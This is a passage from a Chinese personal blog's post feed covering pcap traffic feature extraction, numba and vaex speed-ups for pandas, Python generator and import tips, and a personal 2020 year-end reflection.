class="hljs-keyword">lambda</span> x: x.haslayer(<span class="hljs-string">&#x27;TCP&#x27;</span>))<br>--------------------------------------------------<br>&lt;filtered qqlarge.pcap: TCP:<span class="hljs-number">9201</span> UDP:<span class="hljs-number">0</span> ICMP:<span class="hljs-number">0</span> Other:<span class="hljs-number">0</span>&gt;<br></code></pre></td></tr></table></figure><p>然后对于已知的流量包，去 github 上找了现成的轮子<a href="https://github.com/jiangph1001/flow-feature.git">https://github.com/jiangph1001/flow-feature.git</a>。提取效果如下。</p><p><img src="https://image.hackerjerry.top/Analysis-video-traffic-with-wireshark-10.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&name=image.png&originHeight=414&originWidth=931&size=44543&status=done&style=none&width=440" alt="image.png"><br>可以看到，在观看视频的时间里，与服务器 ip 之间的数据流是最多的。</p><h1 id="过滤-idea"><a href="#过滤-idea" class="headerlink" title="过滤 idea"></a>过滤 idea</h1><ol><li>可以分析视频流 tcp 报文的频谱，进行傅里叶变换或者小波变换，得到正常情况下的能量谱特征。</li><li>对于 DDos 等其他攻击情况下的频谱，也可以进行相关分析。</li><li>对于正常的 TCP 流，可以使用<strong>梳状滤波器</strong>进行滤波，让 RTT 对应频带的频率通过，保证大部分正常 TCP 流量通过，然后将其余的归为灰流量。<blockquote><p>见参考文献：基于频谱分析的 LDos 攻击流量过滤方法</p></blockquote></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>在查解析 pcap 包的时候发现了这样几个仓库，感觉很棒。<br>Joy <a href="https://github.com/cisco/joy">https://github.com/cisco/joy</a><br>相关使用可参考<a href="https://flashgene.com/archives/70939.html">https://flashgene.com/archives/70939.html</a><br><a href="https://www.freebuf.com/sectool/161431.html">https://www.freebuf.com/sectool/161431.html</a><br>官方文档<a href="https://github.com/cisco/joy/blob/master/doc/using-joy-05.pdf">https://github.com/cisco/joy/blob/master/doc/using-joy-05.pdf</a><br>更详细的使用可以见<a href="https://github.com/cisco/joy/wiki">https://github.com/cisco/joy/wiki</a>，里面包括了搭建，捕获，特征提取的全过程</p><p><a href="https://asmcn.icopy.site/awesome/awesome-pcaptools/">https://asmcn.icopy.site/awesome/awesome-pcaptools/</a><br>这个是收录的所有和 pcap 相关的工具，包括抓取，解析，提取特征。而这个站点，真的是一个宝藏站点，里面啥都有…真的太强了。<br><a href="https://asmcn.icopy.site/awesome/awesome-network-analysis/#software">https://asmcn.icopy.site/awesome/awesome-network-analysis/#software</a> 比如这个就是网络分析相关的软件大全（图论相关）</p>]]></content>
    
    
    <categories>
      
      <category>流量分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wireshark</tag>
      
      <tag>视频流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python-faster-pandas-skills</title>
    <link href="/2021/02/04/python-faster-pandas-skills_new/"/>
    <url>/2021/02/04/python-faster-pandas-skills_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="numba-加速"><a href="#numba-加速" class="headerlink" title="numba 加速"></a>numba 加速</h1><p>原文链接：<a href="https://zhuanlan.zhihu.com/p/78882641">https://zhuanlan.zhihu.com/p/78882641</a><br>使用 numba 非常简单，只需要将 numba 装饰器应用到 python 函数中，无需改动原本的 python 代码，numba 会自动完成剩余的工作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> numba<br><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> jit<br><span class="hljs-meta">@jit(nopython=True) # jit，numba装饰器中的一种</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">go_fast</span>(<span class="hljs-params">a</span>):</span> <span class="hljs-comment"># 首次调用时，函数被编译为机器代码</span><br>    trace = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 假设输入变量是numpy数组</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(a.shape[<span class="hljs-number">0</span>]):   <span class="hljs-comment"># Numba 擅长处理循环</span><br>        trace += np.tanh(a[i, i])<br>    <span class="hljs-keyword">return</span> a + trace<br></code></pre></td></tr></table></figure><p>以上代码是一个 python 函数，用以计算 numpy 数组各个数值的双曲正切值，我们使用了 numba 装饰器，它将这个 python 函数编译为等效的机器代码，可以大大减少运行时间。</p><p>什么情况下使用 numba 呢？</p><ul><li><p>使用 numpy 数组做大量科学计算时</p></li><li><p>使用 for 循环时</p></li></ul><h1 id="Vaex-大数据"><a href="#Vaex-大数据" class="headerlink" title="Vaex-大数据"></a>Vaex-大数据</h1><p>pandas 能应付较大数据集（千万行级别），但当数据量达到十亿百亿行级别，pandas 处理起来就有点力不从心了，可以说非常的慢。<br>官网对 vaex 的介绍可以总结为三点：</p><ol><li>vaex 是一个用处理、展示数据的数据表工具，类似 pandas；</li><li>vaex 采取内存映射、惰性计算，不占用内存，适合处理大数据；</li><li>vaex 可以在百亿级数据集上进行秒级的统计分析和可视化展示；</li></ol><p>vaex 的优势在于：</p><ol><li>性能：处理海量数据，<img src="https://cdn.nlark.com/yuque/0/2021/svg/1629942/1612452799902-870408e1-e8d4-4be6-8e01-4f210cfbfeb2.svg#align=left&display=inline&height=24&margin=%5Bobject%20Object%5D&originHeight=24&originWidth=30&size=0&status=done&style=none&width=30"> 行/秒；</li><li>惰性：快速计算，不占用内存；</li><li>零内存复制：在进行过滤/转换/计算时，不复制内存，在需要时进行流式传输；</li><li>可视化：内含可视化组件；</li><li>API：类似 pandas，拥有丰富的数据处理和计算函数；</li><li>可交互：配合 Jupyter notebook 使用，灵活的交互可视化；</li></ol><p>vaex 支持读取 hdf5、csv、parquet 等文件，使用 read 方法。<strong>hdf5 可以惰性读取，而 csv 只能读到内存中。</strong></p><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><p><img src="https://image.hackerjerry.top/python-faster-pandas-skills-1.png#align=left&display=inline&height=238&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=1103&size=551802&status=done&style=none&width=551.5" alt="image.png"></p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a><strong>数据处理</strong></h2><p>有时候我们需要对数据进行各种各样的转换、筛选、计算等，pandas 的每一步处理都会消耗内存，而且时间成本高。除非说使用链式处理，但那样过程就很不清晰。<br>vaex 则全过程都是零内存。因为它的处理过程仅仅产生 expression（表达式），表达式是逻辑表示，不会执行，只有到了最后的生成结果阶段才会执行。而且整个过程数据是流式传输，不会产生内存积压。<br><img src="https://image.hackerjerry.top/python-faster-pandas-skills-2.png#align=left&display=inline&height=390&margin=%5Bobject%20Object%5D&name=image.png&originHeight=780&originWidth=850&size=291737&status=done&style=none&width=425" alt="image.png"></p><p>vaex 的统计计算函数：<br><img src="https://image.hackerjerry.top/python-faster-pandas-skills-3.png#align=left&display=inline&height=327&margin=%5Bobject%20Object%5D&name=image.png&originHeight=654&originWidth=1094&size=916957&status=done&style=none&width=547" alt="image.png"></p><h2 id="可视化展示"><a href="#可视化展示" class="headerlink" title="可视化展示"></a><strong>可视化展示</strong></h2><p>vaex 还可以进行快速可视化展示，即便是上百亿的数据集，依然能秒出图。<br><img src="https://image.hackerjerry.top/python-faster-pandas-skills-4.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&name=image.png&originHeight=641&originWidth=767&size=819723&status=done&style=none&width=383.5" alt="image.png"><br>vaex 可视化函数：<br><img src="https://image.hackerjerry.top/python-faster-pandas-skills-5.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=390&originWidth=1108&size=378518&status=done&style=none&width=554" alt="image.png"><br>附：hdf5 数据集生成代码（4 列 1 亿行数据）</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> vaex<br>df = pd.DataFrame(np.random.rand(<span class="hljs-number">100000000</span>,<span class="hljs-number">4</span>),<span class="hljs-keyword">columns</span>=[<span class="hljs-string">&#x27;col_1&#x27;</span>,<span class="hljs-string">&#x27;col_2&#x27;</span>,<span class="hljs-string">&#x27;col_3&#x27;</span>,<span class="hljs-string">&#x27;col_4&#x27;</span>])<br>df.to_csv(<span class="hljs-string">&#x27;example.csv&#x27;</span>,<span class="hljs-keyword">index</span>=<span class="hljs-keyword">False</span>)<br>vaex.<span class="hljs-keyword">read</span>(<span class="hljs-string">&#x27;example.csv&#x27;</span>,convert=<span class="hljs-string">&#x27;example1.hdf5&#x27;</span>)<br></code></pre></td></tr></table></figure><p>注意这里不要用 pandas 直接生成 hdf5，其格式会与 vaex 不兼容。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>pandas</tag>
      
      <tag>数据分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python-ML-usefull-skills</title>
    <link href="/2020/12/15/Python-ML-usefull-skills_new/"/>
    <url>/2020/12/15/Python-ML-usefull-skills_new/</url>
    
    <content type="html"><![CDATA[<p>记录一下机器学习所要用到的 python 相关知识</p><a id="more"></a><h1 id="高性能-Pandas：eval-与-query"><a href="#高性能-Pandas：eval-与-query" class="headerlink" title="高性能 Pandas：eval()与 query()"></a>高性能 Pandas：eval()与 query()</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.12-Performance-Eval-and-Query.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.12-Performance-Eval-and-Query.ipynb</a></p><h1 id="三维绘图"><a href="#三维绘图" class="headerlink" title="三维绘图"></a>三维绘图</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/04.12-Three-Dimensional-Plotting.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/04.12-Three-Dimensional-Plotting.ipynb</a></p><h1 id="可视化-error-残差"><a href="#可视化-error-残差" class="headerlink" title="可视化 error 残差"></a>可视化 error 残差</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/04.03-Errorbars.ipynb">可视化异常处理</a></p><h1 id="向量化字符串操作"><a href="#向量化字符串操作" class="headerlink" title="向量化字符串操作"></a>向量化字符串操作</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.10-Working-With-Strings.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/03.10-Working-With-Strings.ipynb</a></p><h1 id="数组计算：广播"><a href="#数组计算：广播" class="headerlink" title="数组计算：广播"></a>数组计算：广播</h1><p>参考：<a href="https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/02.05-Computation-on-arrays-broadcasting.ipynb">https://github.com/jakevdp/PythonDataScienceHandbook/blob/master/notebooks/02.05-Computation-on-arrays-broadcasting.ipynb</a></p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>Machine Learning</tag>
      
      <tag>pandas</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020-year-end-summary</title>
    <link href="/2020/11/29/2020-year-end-summary_new/"/>
    <url>/2020/11/29/2020-year-end-summary_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>写下这篇 2020 年终总结的时候，是 11 月 30 号，距离 2020 年结束还有 31 天。</p><p>我坐在 C 楼的教室里，仍然是听着歌，准备写一些今年的所感所想。</p><p>今天天气多云，气温很低，还好教室人不是很多。</p><h1 id="魔幻的一年"><a href="#魔幻的一年" class="headerlink" title="魔幻的一年"></a>魔幻的一年</h1><p>去年跨年的时候，我们在调侃要被当作贫困人口而被消灭了，然而新冠疫情突然爆发，打得所有人措手不及。</p><p>今年跨年，我估计大家都是希望活着就好，愈发的感受到了身体的重要，平安喜乐，身体康健，真的是对一个人最大的祝福了。</p><p>昨天晚上，点开了去年的 blog，把 2018 年和 2019 年的年终总结又读了一遍，感慨良多。</p><p>这一年，物是人非。</p><p>我只是在这个时代下被社会洪流裹挟的一个普通个体，平平淡淡，默默无闻。永远保持谦卑，永远相信人外有人，及时的跳出安逸圈鞭打自己。</p><h1 id="时间线-📆"><a href="#时间线-📆" class="headerlink" title="时间线 📆"></a>时间线 📆</h1><ul><li><p>2020-01</p><ul><li>回高中看老师+尴尬的宣讲（把我们学校和一群文科学校分在一起）</li></ul></li><li><p>2020-02</p><ul><li>美赛+分手</li></ul></li><li><p>2020-03</p><ul><li>线上学期开始，惶惶不可终日</li></ul></li><li><p>2020-04</p><ul><li>美赛 M 奖+加入科研组+信安作品赛</li></ul></li><li><p>2020-05</p><ul><li>校赛一等奖+开始读论文</li></ul></li><li><p>2020-06</p><ul><li>互联网+校赛金奖，忙着复习（补天）+大作业</li></ul></li><li><p>2020-07</p><ul><li>疯狂复习+无数的大作业</li></ul></li><li><p>2020-08</p><ul><li>返校考试，开学</li></ul></li><li><p>2020-09</p><ul><li>互联网+省赛金奖+校一等奖学金</li></ul></li><li><p>2020-10</p><ul><li>十月下了很长时间的雨</li><li>国家奖学金 get+科研</li></ul></li><li><p>2020-11</p><ul><li>复习+写作业+高党+开会+评议+一堆事<blockquote><p>今天预备党员名单也出了，意料之中，我没有成为本批次的发展对象。<br>岂能尽如人意，但求无愧我心。</p></blockquote></li></ul></li><li><p>2020-12</p><ul><li>大作业+复习+考试</li></ul></li></ul><h1 id="写给自己-💬"><a href="#写给自己-💬" class="headerlink" title="写给自己 💬"></a>写给自己 💬</h1><p>本科生活已经过半，未来的路还不知通向何方。</p><p>但我将永远记得——</p><p><strong>我深知自己并非美玉，故而不敢抛光争辉，</strong></p><p><strong>却又坚信自己通过付出，可以成为美玉，</strong></p><p><strong>故而不肯流于外在，与庸碌一生。</strong></p><p><strong>我不知道命运会把我带向何方，但是我一直会用善良维护左右。</strong></p><p>是的，我坚信冥冥之中的一切，命运自有安排。我现在需要做的，就是提升自己，充实自己，丰富自己，像陈年的美酒一样，经历时间的打磨和淬炼，去拥抱未知的变数。</p><p>现在想想自己，年轻的好傻，但那就是青春，不是吗？没有早恋的青春是不完整的，没有失恋的青春也是不完整的，但我经历过了，美好和苦楚我都品尝过了，就够了。</p><p>我相信，相逢的人会再重逢，迷失的人会再迷失。</p><h1 id="警醒自己-❗"><a href="#警醒自己-❗" class="headerlink" title="警醒自己 ❗"></a>警醒自己 ❗</h1><p><strong>吃不了自律的苦，就要受平庸的罪。</strong></p><p>不要跟我说什么早起效率低，你为什么不能早睡？</p><blockquote><p>您记住了，千古以来，要饭的，没有要早饭的<br>为什么呢？<br>因为，他能早起就不至于要饭。<br>—郭德纲</p></blockquote><p>在一个理工类大学，异性确实稀少，情侣也确实很多，但请不要受此影响，不要想着在本科谈恋爱了。感觉自己确实不是谈恋爱那块料，不懂得怎么聊天，不知道如何接近，也确实活该单身呀。我觉得吧，慢慢走吧，最后总会遇到的。</p><p>不是所有人单身都代表是可撩状态，有些人对恋爱没什么期待，只想安安静静读几年书然后发财。</p><p>是的，我确实是一个这样的俗人，恋爱的甜蜜对我的诱惑比不上发财。So，Just keep going💪</p><blockquote><p>但如果在赚钱的道路上遇到了甜美的爱情我也要抓住呀 ❤（希望如此）</p></blockquote><h1 id="2021-共勉-💖"><a href="#2021-共勉-💖" class="headerlink" title="2021 共勉 💖"></a>2021 共勉 💖</h1><p><font face="楷体" font-size="19px">不是所有坚持都有结果，但是总有一些坚持，能从一寸冰封的土地里，培育出十万朵怒放的蔷薇。</font></p><p><font face="楷体" font-size="19px">少年从黑暗中来，却满目星辰毫无戾气，风尘仆仆又温柔至极。</font></p><p><font face="楷体" font-size="19px">希望你有皮鞋也有跑鞋，喝茶也喝酒。</font></p><p><font face="楷体" font-size="19px">希望你有勇敢的朋友，有牛逼的对手；</font></p><p><font face="楷体" font-size="19px">希望你对过往一切情深意重但从不回头。</font></p><p><font face="楷体" font-size="19px">希望你对想要的未来抵死执着但当下却无紧迫神色。</font></p><p><font face="楷体" font-size="19px">希望你特别美，特别敢，特别温柔特别狠。</font></p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>年终总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Interesting-Things</title>
    <link href="/2020/11/28/Interesting-Things_new/"/>
    <url>/2020/11/28/Interesting-Things_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>宜家真是太厚道了……我之前买了个家具 3600，放在那边一直没装，现在调价 2800 了……我觉得好不爽，但是也认了……<br>结果和店员吐槽这个事情，店员说半年可退换啊，你直接拿来退就好。我说算了，好大个东西，搬来搬去太麻烦。<br>结果店员说你以前发票还在不在？在的话你下次带来再买一个新的，然后用过去的发票来我这退新的就好，卧槽，好机智。<br>回帖：这个思路我用过，之前淘宝买衣服，尺码不合适，偏偏没买运费险。我就和客服说好，又买了尺码合适的，这回买运费险，收货后把第一件退回去。双方都皆大欢喜。</p><blockquote><p>作者：莞尔<br>链接：<a href="https://www.zhihu.com/question/431045341/answer/1593782118">https://www.zhihu.com/question/431045341/answer/1593782118</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p></blockquote><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><img src="https://image.hackerjerry.top/Interesting-Things-1.png#align=left&display=inline&height=135&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=677&size=161800&status=done&style=none&width=456" alt="image.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>生活</tag>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tricks-in-python</title>
    <link href="/2020/11/28/Tricks-in-python_new/"/>
    <url>/2020/11/28/Tricks-in-python_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="装饰器-classmethod-和-staticmethod"><a href="#装饰器-classmethod-和-staticmethod" class="headerlink" title="装饰器-@classmethod 和@staticmethod"></a>装饰器-@classmethod 和@staticmethod</h1><p>将方法定义成类方法和静态方法。</p><p><a href="https://zhuanlan.zhihu.com/p/28010894">https://zhuanlan.zhihu.com/p/28010894</a><br>可以看看这篇文章</p><h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><h2 id="通过函数方式创建"><a href="#通过函数方式创建" class="headerlink" title="通过函数方式创建"></a>通过函数方式创建</h2><p>通过<code>yield</code>关键字将一个函数变成<code>generator</code>。例如：<br>函数的定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span>(<span class="hljs-params">max</span>):</span><br>    n, a, b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> n &lt; max:<br>        print(b)<br>        a, b = b, a + b<br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;done&#x27;</span><br></code></pre></td></tr></table></figure><p>生成器的定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span>(<span class="hljs-params">max</span>):</span><br>    n, a, b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> n &lt; max:<br>        <span class="hljs-keyword">yield</span> b<br>        a, b = b, a + b<br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;done&#x27;</span><br></code></pre></td></tr></table></figure><p>两者的差别在于生成器将函数的<code>print(b)</code>改为<code>yield b</code>。<code>yield</code>可以翻译为<code>生成</code>，即基于某次计算生成某个元素，而不是提前存储了该元素。<br>函数式的<code>generator</code>一般采用<code>for</code>循环来获取元素，也可以通过<code>next()</code>来获取下一个元素的值，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> fib(<span class="hljs-number">6</span>):<br><span class="hljs-meta">... </span>    print(n)<br>...<br><span class="hljs-number">1</span><br><span class="hljs-number">1</span><br><span class="hljs-number">2</span><br><span class="hljs-number">3</span><br><span class="hljs-number">5</span><br><span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>如果要获取<code>return</code>的内容，可以捕获<code>StopIteration</code>错误，返回值包含在<code>StopIteration</code>的<code>value</code>中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>g = fib(<span class="hljs-number">6</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">try</span>:<br><span class="hljs-meta">... </span>        x = next(g)<br><span class="hljs-meta">... </span>        print(<span class="hljs-string">&#x27;g:&#x27;</span>, x)<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">except</span> StopIteration <span class="hljs-keyword">as</span> e:<br><span class="hljs-meta">... </span>        print(<span class="hljs-string">&#x27;Generator return value:&#x27;</span>, e.value)<br><span class="hljs-meta">... </span>        <span class="hljs-keyword">break</span><br>...<br>g: <span class="hljs-number">1</span><br>g: <span class="hljs-number">1</span><br>g: <span class="hljs-number">2</span><br>g: <span class="hljs-number">3</span><br>g: <span class="hljs-number">5</span><br>g: <span class="hljs-number">8</span><br>Generator <span class="hljs-keyword">return</span> value: done<br></code></pre></td></tr></table></figure><h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><h2 id="访问限制"><a href="#访问限制" class="headerlink" title="访问限制"></a>访问限制</h2><p>实例的变量以<code>__xxx</code>双下划线开头，没有以<code>__</code>双下划线结尾的，则该变量为私有变量，外部一般无法访问。例如：<code>self.__name = name</code>。<br>如果变量名是双下划线开头、双下划线结尾，<code>__xxx__</code>是特殊变量而不是私有变量。私有变量的方式可以避免外部对实例内部数据的修改，可以做参数检查。<br>如果需要获取或修改内部的数据，可以增加<code>get</code>和<code>set</code>的方法。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-comment">#构造函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name, score</span>):</span><br>        self.__name = name<br>        self.__score = score<br>    <span class="hljs-comment">#get方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_name</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.__name<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_score</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.__score<br>     <span class="hljs-comment">#set方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_score</span>(<span class="hljs-params">self, score</span>):</span><br>        <span class="hljs-comment">#参数检查</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= score &lt;= <span class="hljs-number">100</span>:<br>            self.__score = score<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;bad score&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugs-in-python</title>
    <link href="/2020/11/28/Bugs-in-python_new/"/>
    <url>/2020/11/28/Bugs-in-python_new/</url>
    
    <content type="html"><![CDATA[<p>记录在编写 python 程序中遇到的 bug 们。</p><a id="more"></a><h1 id="跨目录调用模块"><a href="#跨目录调用模块" class="headerlink" title="跨目录调用模块"></a>跨目录调用模块</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">project</span><br>├── <span class="hljs-selector-tag">package1</span><br>│   ├── __<span class="hljs-selector-tag">init__</span><span class="hljs-selector-class">.py</span><br>│   ├── <span class="hljs-selector-tag">module_11</span><span class="hljs-selector-class">.py</span><br>│   └── <span class="hljs-selector-tag">module_12</span><span class="hljs-selector-class">.py</span><br>├── <span class="hljs-selector-tag">package2</span><br>│   ├── __<span class="hljs-selector-tag">init_</span><span class="hljs-selector-class">.py</span><br>│   ├── <span class="hljs-selector-tag">module_21</span><span class="hljs-selector-class">.py</span><br>│   └── <span class="hljs-selector-tag">module_22</span><span class="hljs-selector-class">.py</span><br>├── <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span><br>└── <span class="hljs-selector-tag">tool</span><span class="hljs-selector-class">.py</span><br></code></pre></td></tr></table></figure><p>对于这样一个目录结构的项目，我们需要知道：<br>Python 解析器对<strong>模块位置的搜索顺序</strong>：</p><ol><li><strong>当前目录</strong>。</li><li>PYTHONPATH 的每个目录。</li><li>查看 Python 安装时的默认包路径。例如：<code>/usr/lib64/python2.6/site-packages</code>。<blockquote><p>可以通过查询<code>sys.path</code>查看模块搜索路径。</p></blockquote></li></ol><h2 id="在子包（package-中引入根目录"><a href="#在子包（package-中引入根目录" class="headerlink" title="在子包（package)中引入根目录"></a>在子包（package)中引入根目录</h2><ul><li><p>将项目的根目录加到 PYTHONPATH 变量中</p></li><li><p>sys.path.append(“..”)</p></li></ul><h2 id="同级模块（module）引用"><a href="#同级模块（module）引用" class="headerlink" title="同级模块（module）引用"></a>同级模块（module）引用</h2><p><code>module_11.py</code>文件导入 module_12.py 模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> module_12<br></code></pre></td></tr></table></figure><h2 id="导入下级模块"><a href="#导入下级模块" class="headerlink" title="导入下级模块"></a>导入下级模块</h2><p><code>main.py</code>文件导入<code>module_12.py</code>模块</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> package<span class="hljs-number">1</span> import module_<span class="hljs-number">12</span><br><span class="hljs-comment"># 或者</span><br><span class="hljs-attribute">import</span> package<span class="hljs-number">1</span>.module_<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h2 id="导入上级模块"><a href="#导入上级模块" class="headerlink" title="  导入上级模块"></a>  导入上级模块</h2><p><code>module_11.py</code>导入上级目录的<code>tool.py</code>模块</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> sys<br>sys.<span class="hljs-built_in">path</span>.append(<span class="hljs-string">&quot;..&quot;</span>)<br><span class="hljs-keyword">import</span> tool<br></code></pre></td></tr></table></figure><p>相当于通过<code>sys.path.append(&quot;..&quot;)</code>进入上级目录，然后类似导入<code>同级目录</code>模块的方式导入。</p><h2 id="导入跨包下级模块"><a href="#导入跨包下级模块" class="headerlink" 